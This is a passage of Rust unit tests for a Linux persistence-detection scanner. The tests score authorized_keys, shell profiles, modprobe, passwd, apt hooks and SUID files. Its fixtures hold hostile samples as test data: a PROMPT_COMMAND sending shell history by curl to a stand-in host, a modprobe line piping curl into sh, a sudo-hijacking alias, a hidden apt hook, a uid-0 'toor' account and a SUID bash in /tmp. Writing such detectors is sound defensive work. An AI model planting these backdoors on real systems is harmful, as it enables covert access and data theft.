        let t = "# c\nssh-ed25519 AAAAC3Nza alice@laptop\ncommand=\"/usr/bin/rrsync /bk\",no-pty ssh-rsa AAAAB3 backup key\nfrom=\"10.0.0.1\" ecdsa-sha2-nistp256 AAAAE2\nnot a key\n";
        let k = parse_authorized_keys(t);
        assert_eq!(k.len(), 3);
        assert_eq!(
            k[0],
            (String::new(), "ssh-ed25519".into(), "alice@laptop".into())
        );
        assert!(k[1].0.starts_with("command="));
        assert_eq!(k[1].2, "backup key");
        let e = authorized_key_entries("/root/.ssh/authorized_keys", "root", t);
        assert_eq!(e.len(), 3);
        assert_eq!(
            score(&e[0], NOW).unwrap().severity,
            Severity::Info,
            "inventory"
        );
        let mut r = e[0].clone();
        r.mtime = Some(NOW - 100);
        assert_eq!(
            score(&r, NOW).unwrap().severity,
            Severity::Low,
            "recently added key"
        );
    }

    #[test]
    fn profiles() {
        let t = "export PATH=$PATH:/opt/bin\nalias ll='ls -l'\nalias sudo='/tmp/.s/sudo'\nexport PROMPT_COMMAND='history -a; curl -s x.y/$(history 1)'\n";
        let v = profile_entries("/home/u/.bashrc", t);
        assert_eq!(v.len(), 2);
        assert!(v.iter().all(|e| e.floor == Severity::High));
    }

    #[test]
    fn modprobe_passwd_apt() {
        let m = modprobe_entries(
            "/etc/modprobe.d/x.conf",
            "install usb-storage /bin/true\ninstall dccp /bin/sh -c 'curl x|sh'\nblacklist x\n",
        );
        assert_eq!(m.len(), 1);
        assert_eq!(score(&m[0], NOW).unwrap().severity, Severity::High);
        let p = passwd_entries("/etc/passwd", "root:x:0:0:root:/root:/bin/bash\ntoor:x:0:0::/root:/bin/bash\nbob:x:1000:1000::/home/bob:/bin/bash\n");
        assert_eq!(p.len(), 1);
        assert_eq!(p[0].name, "toor");
        let a = apt_hook_entries(
            "/etc/apt/apt.conf.d/99x",
            "APT::Update::Pre-Invoke {\"nohup /tmp/.a >/dev/null 2>&1 &\"};\n",
        );
        assert_eq!(a[0].command, "nohup /tmp/.a >/dev/null 2>&1 &");
        let mut ae = a[0].clone();
        ae.owned = Some(false);
        assert_eq!(score(&ae, NOW).unwrap().severity, Severity::High);
    }

    #[test]
    fn suid() {
        assert!(suid_entry("/usr/bin/ls", 0o755, Some(true), None, None, NOW).is_none());
        let e = suid_entry("/usr/bin/passwd", 0o4755, Some(true), Some(1), None, NOW).unwrap();
        assert!(score(&e, NOW).is_none());
        let e = suid_entry(
            "/tmp/.b/bash",
            0o4755,
            Some(false),
            Some(NOW - 10),
            None,
            NOW,
        )
        .unwrap();
        assert_eq!(score(&e, NOW).unwrap().severity, Severity::Critical);
        let e = suid_entry(
            "/usr/local/bin/tool",
            0o4755,
            Some(false),
            Some(1),
            None,
            NOW,
        )
        .unwrap();
        assert_eq!(score(&e, NOW).unwrap().severity, Severity::Low);
    }
}
